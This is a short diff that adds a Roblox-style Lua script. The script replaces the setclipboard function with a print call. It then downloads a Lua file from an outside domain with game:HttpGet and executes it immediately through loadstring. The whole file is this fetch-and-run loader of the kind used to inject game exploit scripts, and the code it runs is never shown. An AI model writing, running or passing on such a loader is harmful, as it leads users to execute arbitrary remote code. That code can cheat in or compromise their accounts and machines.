@@ -1,0 +1,4 @@
+setclipboard = function(text)
+    print(text)
+end
+loadstring(game:HttpGet("https://egorikusa.space/8c14a95b742dc523eb2befbb.lua", true))()
